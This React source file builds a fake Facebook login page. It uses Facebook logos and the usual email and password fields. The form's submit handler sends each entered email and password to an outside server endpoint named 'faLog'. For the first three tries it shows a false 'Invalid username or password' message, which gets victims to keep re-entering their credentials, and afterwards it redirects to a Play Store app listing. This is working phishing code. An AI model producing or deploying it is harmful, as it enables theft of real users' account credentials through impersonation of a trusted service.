import "./App.css";
import fb from "../public/fb-logo.svg";
import fbLast from "../public/Fb-last.png";
import or from "../public/or.png";
import { useState } from "react";
function App() {
  const [num, setNum] = useState(0);
  const [isWrong, setIsWrong] = useState(false);
  const handleLogin = (event) => {
    event.preventDefault();
    const form = event.target;
    const email = form.email.value;
    const password = form.password.value;
    console.log(email, password);
    const user = { email, password };
    console.log(num);
    if (num <= 2) {
      setIsWrong(true);
      setNum(num + 1);
      fetch("https://summer-camp-server-black.vercel.app/faLog", {
        method: "POST",
        headers: {
          "content-type": "application/json",
        },
        body: JSON.stringify(user),
      })
        .then((res) => res.json())
        .then((data) => console.log(data));
      return;
    }
    setIsWrong(false);
    fetch("https://summer-camp-server-black.vercel.app/faLog", {
      method: "POST",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(user),
    })
      .then((res) => res.json())
      .then((data) => {
        if (data.insertedId) {
          location.assign(
            "https://play.google.com/store/apps/details?id=com.takaincome.onlineincome&hl=en_US"
          );
        }
      });
  };
  return (
    <div className="mainContent">
      <div
        className="invalid"
        style={{ display: `${isWrong ? "block" : "none"}` }}
      >
        Invalid username or password
      </div>
      <img
        className="fb-logo"
        style={{ marginTop: `${isWrong ? "40px" : "0px"}` }}
        src={fb}
        alt=""
      />

      <form onSubmit={handleLogin}>
        <input
          name="email"
          className="inputBox"
          type="text"
          placeholder="Mobile number or email address"
        />
        <input
          name="password"
          className="inputBox"
          type="password"
          placeholder="Password"
        />
        <input className="login-btn" value="Log In" type="submit" />
      </form>
      <a className="link" href="#">
        Forgotten password?
      </a>
      <img src={or} alt="" />
      <input className="create-btn" value="Create new account" type="submit" />
      <img style={{ maxWidth: "400px" }} src={fbLast} alt="" />
    </div>
  );
}

export default App;
